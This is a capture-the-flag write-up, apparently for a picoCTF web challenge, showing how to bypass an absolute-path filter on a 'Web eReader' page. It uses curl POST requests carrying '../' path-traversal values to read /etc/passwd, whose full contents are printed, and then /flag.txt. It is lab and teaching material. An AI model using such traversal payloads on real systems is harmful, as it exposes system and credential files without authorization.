## Description
Can you get the flag? Here's the website. We know that the website files live in /usr/share/nginx/html/ and the flag is at /flag.txt but the website is filtering absolute file paths. Can you get past the filter to read the flag?

## Solution

Seem to be vulnerable to LFI. checking:

```bash
curl -X POST "http://saturn.picoctf.net:55793/read.php" --data "filename=../../../../../etc/passwd"
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="style.css">
    <title>Web eReader</title>
  </head>
  <body>
    
    root:x:0:0:root:/root:/bin/bash
<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin
<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin
<br>sync:x:4:65534:sync:/bin:/bin/sync
<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin
<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
<br>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
<br>nginx:x:101:101:nginx user,,,:/nonexistent:/bin/false
<br>systemd-timesync:x:102:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
<br>systemd-network:x:103:104:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
<br>systemd-resolve:x:104:105:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
<br><br>  </body>
</html>
```

Now let's try to find the flag.

```bash
curl -X POST "http://saturn.picoctf.net:55793/read.php" --data "filename=../../../../../../flag.txt"
```